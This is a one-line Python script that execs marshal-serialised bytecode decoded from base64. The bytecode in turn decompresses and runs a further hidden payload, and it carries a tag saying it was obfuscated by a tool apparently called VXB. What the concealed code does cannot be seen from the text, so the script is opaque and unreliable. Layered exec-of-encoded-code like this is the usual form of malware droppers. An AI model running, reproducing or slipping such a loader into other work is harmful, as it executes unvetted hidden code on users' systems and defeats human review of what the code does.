import zlib,marshal,base64;from Crypto.Cipher import AES;from Crypto.Random import get_random_bytes;from Crypto.Util.Padding import pad, unpad;exec(marshal.loads(base64.b64decode("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")))